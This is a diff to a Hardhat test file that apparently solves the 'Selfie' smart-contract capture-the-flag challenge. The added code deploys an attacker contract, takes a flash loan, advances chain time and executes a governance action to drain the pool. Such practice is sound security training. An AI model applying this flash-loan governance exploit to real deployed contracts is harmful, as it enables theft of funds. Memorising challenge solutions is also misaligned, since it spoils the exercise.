@@ -1,6 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
-const { time } = require("@nomicfoundation/hardhat-network-helpers");
+const helpers = require("@nomicfoundation/hardhat-network-helpers");
 
 describe('[Challenge] Selfie', function () {
     let deployer, player;
@@ -37,9 +37,19 @@ describe('[Challenge] Selfie', function () {
 
     });
 
-    it('Execution', async function () {
+    it("Execution", async function () {
         /** CODE YOUR SOLUTION HERE */
-    });
+        const Attacker = await ethers.getContractFactory("SelfieAttacker");
+        const attacker = await Attacker.deploy(
+          pool.address,
+          governance.address,
+          token.address,
+          player.address
+        );
+        await attacker.getLoan();
+        await helpers.time.increase(3 * 24 * 60 * 60);
+        await attacker.execute();
+      });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
